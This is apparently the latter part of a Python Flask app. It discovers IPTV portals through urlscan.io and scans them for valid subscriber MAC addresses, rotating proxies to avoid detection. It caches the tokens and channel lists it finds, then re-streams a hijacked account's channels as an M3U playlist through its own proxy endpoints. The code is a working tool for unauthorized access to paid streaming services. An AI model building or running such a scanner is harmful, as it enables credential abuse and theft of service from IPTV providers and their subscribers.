    return Response(html_content, mimetype="text/html")


@app.route("/start", methods=["POST"])
def start_scan():
    portal_url = request.form.get("portal_url", "").strip()
    if not portal_url:
        return jsonify({"error": "Missing URL"}), 400

    portal_url = clean_url(portal_url)

    global scan_state
    with state_lock:
        if scan_state["running"]:
            return jsonify({"status": "already running"}), 409

        if not PROXY_LIST:
            logging.warning("Proxy list is empty. Scanning from single IP. Consider implementing a better proxy fetcher.")

        scan_state["running"] = True
        scan_state["target_url"] = portal_url
        scan_state["attempts"] = 0
        scan_state["logs"] = [
            f"Starting high-speed scan on {portal_url}.",
            f"Using {len(PROXY_LIST)} rotating proxies (N/A if 0).",
            "3-Stage check, Enhanced Auth active."
        ]

        scan_state["thread"] = threading.Thread(target=scan_worker, daemon=True)
        scan_state["thread"].start()

    return jsonify({"status": "scan started"})

@app.route("/stop", methods=["POST"])
def stop_scan():
    global scan_state
    with state_lock:
        if scan_state["running"]:
            scan_state["running"] = False
            scan_state["logs"].append("Scan stopped by user.")
        else:
            return jsonify({"status": "already stopped"}), 409
    return jsonify({"status": "scan stopped"})

@app.route("/status")
def status():
    global scan_state, proxy_state
    with state_lock:
        found_data = []
        # Prepare the subset of data the HTML needs for the display list
        for mac, details in mac_channel_cache.items():
            # Get the cleaner display name for the proxy
            proxy_display = get_display_proxy(details["proxy"])
            found_data.append({
                "mac": mac, "portal": details["portal"],
                "expires": details["expires"] or "N/A",
                "proxy_used": proxy_display, # Display only
                "working_channels_count": len(details["channels"])
            })

        return jsonify({
            "running": scan_state["running"], "attempts": scan_state["attempts"],
            "found": found_data,
            "logs": list(scan_state["logs"]),
            # Send the full cache to the front end for the download button/proxy activation.
            "full_cache": mac_channel_cache,
            "proxy_mac": proxy_state["mac"], "proxy_portal": proxy_state["portal"],
            "proxy_channels": len(proxy_state["channels"])
        })


@app.route("/fetch-urls")
def fetch_urls():
    """Fetches portals from urlscan.io, filters, and verifies reachability concurrently."""
    api_url = "https://urlscan.io/api/v1/search/?q=filename:keydown.keycodes.js"
    all_urls = set()
    working_urls = []

    proxies, _ = get_next_proxy()

    # 1. Fetch URLs from API (Synchronous)
    try:
        res = requests.get(api_url, timeout=HEAVY_TIMEOUT, proxies=proxies)
        res.raise_for_status()

        if not res.headers.get('Content-Type', '').startswith('application/json'):
             logging.error(f"URLScan returned non-JSON content. Likely rate limited.")
             return jsonify(working_urls)

        data = res.json()

        for result in data.get('results', []):
            page_url = result.get('page', {}).get('url')
            if page_url:
                parsed = urlparse(page_url)
                hostname = parsed.netloc.split(':')[0]
                dot_count = hostname.count('.')
                # Skip simple IP addresses but allow domains/ports
                if dot_count < 1 or (dot_count == 3 and all(p.isdigit() for p in hostname.split('.'))):
                    continue
                # Use clean_url to ensure the scheme is present and the path is removed
                base_url = clean_url(urlunparse((parsed.scheme, parsed.netloc, '', '', '', '')))
                all_urls.add(base_url)

    except requests.exceptions.RequestException as e:
        logging.error(f"URLScan API fetch failed: {str(e)}")
        return jsonify(working_urls)
    except json.JSONDecodeError as e:
        logging.error(f"URLScan API fetch failed due to invalid JSON. Error: {e}")
        return jsonify(working_urls)


    # 2. Verify Reachability (Concurrent/Parallel)
    futures = [EXECUTOR.submit(check_portal_candidate, url) for url in all_urls]
    for future in as_completed(futures):
        result = future.result()
        if result and result not in working_urls:
            working_urls.append(result)

    return jsonify(working_urls)

@app.route("/proxy/start/<mac>")
def start_proxy(mac):
    """Activates proxy mode for a found MAC."""
    global proxy_state, proxy_thread
    mac_fmt = mac.upper().replace("-", ":")

    if mac_fmt not in mac_channel_cache:
        return jsonify({"error": "MAC not found in cache. Run scanner first."}), 404

    details = mac_channel_cache[mac_fmt]

    if proxy_thread and proxy_thread.is_alive():
        logging.info("[PROXY] Stopping existing proxy thread.")
        proxy_state["mac"] = None # Signal the worker to stop
        proxy_thread.join(timeout=5)

    proxy_state.update({
        "mac": mac_fmt, "portal": details["portal"], "user_agent": details["user_agent"],
        "token": details["token"], "last_token_time": time.time(),
        "channels": details["channels"], "last_channels_fetch": time.time(),
        "session": requests.Session(), "proxy": details["proxy"]
    })

    proxy_thread = threading.Thread(target=proxy_fetch_channels_worker, daemon=True)
    proxy_thread.start()

    logging.info(f"[PROXY] Started proxy for {mac_fmt} on {details['portal']}.")

    return jsonify({
        "status": "proxy started", "mac": mac_fmt, "portal": details["portal"],
        "playlist_url": f"/proxy/playlist.m3u", "channels_count": len(details["channels"])
    })

@app.route("/proxy/playlist.m3u")
def proxy_playlist():
    """Generates an M3U playlist pointing to our stream proxy endpoint."""
    if not proxy_state["mac"]:
        abort(404, "Proxy is not active for a MAC.")

    base = request.host_url.rstrip("/")
    lines = ["#EXTM3U"]

    if not proxy_state["channels"]:
        lines.append(f"#EXTINF:-1,NO CHANNELS LOADED")
        lines.append(f"{base}/stream/0")
        return Response("\n".join(lines), mimetype="audio/x-mpegurl")

    for c in proxy_state["channels"]:
        lines.append(f'#EXTINF:-1 tvg-id="{c["id"]}",{c["name"]}')
        lines.append(f"{base}/proxy/stream/{c['id']}")

    return Response("\n".join(lines), mimetype="audio/x-mpegurl")

@app.route("/proxy/stream/<cid>")
def proxy_stream(cid):
    """Proxies the raw stream URL from the active portal."""
    if not proxy_state["mac"]:
        abort(503, "Proxy not active.")

    ch = next((x for x in proxy_state["channels"] if x["id"] == cid), None)
    if not ch:
        abort(404, "Channel not found or not loaded.")

    stream_url = ch["url"]
    token = proxy_get_token()
    if not token:
        abort(503, "Failed to refresh token for stream.")

    stream_headers = {
        "User-Agent": proxy_state["user_agent"], "Authorization": f"Bearer {token}", "Referer": proxy_state["portal"] + "/"
    }

    current_proxy = proxy_state["proxy"]
    proxies = {"http": current_proxy, "https": current_proxy} if current_proxy else None


    def generate():
        try:
            with proxy_state["session"].get(stream_url, headers=stream_headers, stream=True, timeout=10, proxies=proxies) as r:
                r.raise_for_status()
                for chunk in r.iter_content(chunk_size=65536):
                    if chunk:
                        yield chunk
        except Exception as e:
            logging.error(f"[STREAM PROXY ERROR {cid}] {e}")

    return Response(generate(), mimetype="video/mp2t")


# ============================================
# MAIN EXECUTION
# ============================================
if __name__ == "__main__":

    # --- PROXY MANAGER INITIALIZATION ---
    PROXY_LIST.extend(get_working_proxies(max_proxies=100))
    # --- END PROXY MANAGER ---

    app.run(host="0.0.0.0", port=5000, threaded=True, debug=True, use_reloader=False)
